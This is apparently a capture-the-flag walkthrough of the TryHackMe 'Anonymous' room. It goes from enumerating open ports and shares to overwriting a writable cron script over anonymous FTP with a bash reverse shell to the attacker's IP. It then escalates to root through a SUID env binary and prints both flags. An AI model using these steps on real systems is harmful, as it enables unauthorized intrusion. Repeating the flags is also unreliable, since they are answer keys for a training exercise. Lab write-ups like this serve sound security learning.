# Anonymous

Not the hacking group

Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.

For more information on Linux, check out [Learn Linux](https://tryhackme.com/room/zthlinux)

# #1 - Enumerate the machine.  How many ports are open?

Nmap scan:

~~~
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.50.72
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-06-02T16:32:11+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-02T16:32:11
|_  start_date: N/A
~~~

Answer: `4`

# #2 - What service is running on port 21?

Answer: `ftp`

# #3 - What service is running on ports 139 and 445?

Answer: `smb`

# #4 - There's a share on the user's computer.  What's it called?

With empty password, we are able to list remote shares:

~~~
$ smbclient -L 10.10.64.21
Enter SAMBA\unknown's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
~~~

Answer: `pics`

# #5 - user.txt

*Hint: What's that log file doing there?... nc won't work the way you'd expect it to*

Let's get the files available via the anonymous FTP (use empty password):

~~~
$ ftp 10.10.64.21
Connected to 10.10.64.21 (10.10.64.21).
220 NamelessOne's FTP Server!
Name (10.10.64.21:unknown): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
227 Entering Passive Mode (10,10,252,179,223,188).
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
227 Entering Passive Mode (10,10,252,179,174,86).
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 May 17 21:30 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
-rwxr-xrwx    1 1000     1000          314 May 14 14:52 clean.sh
-rw-rw-r--    1 1000     1000          172 Jun 02 16:35 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> mget *
mget clean.sh? y
227 Entering Passive Mode (10,10,252,179,25,190).
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00302 secs (103.97 Kbytes/sec)
mget removed_files.log? y
227 Entering Passive Mode (10,10,252,179,164,177).
150 Opening BINARY mode data connection for removed_files.log (172 bytes).
226 Transfer complete.
172 bytes received in 9.3e-05 secs (1849.46 Kbytes/sec)
mget to_do.txt? y
227 Entering Passive Mode (10,10,252,179,107,8).
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.0681 secs (1.00 Kbytes/sec)
ftp> 221 Goodbye.
~~~

Now, let's see what the files are:

```bash
$ cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
$ cat to_do.txt 
I really need to disable the anonymous login...it's really not safe
```

Several things to note here:
1. The log file contains several lines. It's probably because the script ran several times (likely cron job, every minute or so)
2. The `scripts` directory is writeable.

Let's replace the script with a reverse shell:

```bash
$ cat clean.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.8.50.72/4444 0>&1
```

~~~
unknown@localhost:/data/documents/challenges/TryHackMe/Anonymous$ rlwrap nc -nlvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.64.21.
Ncat: Connection from 10.10.64.21:49362.
bash: cannot set terminal process group (1573): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ 
namelessone@anonymous:~$ ls
ls
pics
user.txt
cat user.txt
90d6f992585815ff991e68748c414740
~~~

User flag: `90d6f992585815ff991e68748c414740`


# #6 - root.txt

*Hint: This may require you to do some outside research*

From here, I was able to confirm that the `clean.sh` script was executed by crontab, every 5 minutes:

~~~
namelessone@anonymous:/home$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/5 * * * * /var/ftp/scripts/clean.sh
~~~

I tried to check my privileges with `sudo -l` but as I don't have the user's password, it failed. Let's check what programs are owned by root with the SUID bit set:

~~~
namelessone@anonymous:/etc$ find / -user root -perm -u=s 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env         <------- interesting!
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
~~~

GTFOBins (https://gtfobins.github.io/gtfobins/env/) reveals a potential privilege escalation:

~~~
namelessone@anonymous:~$ env /bin/sh -p
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt	
4d930091c31a622a7ed10f27999af363
~~~

Root flag: `4d930091c31a622a7ed10f27999af363`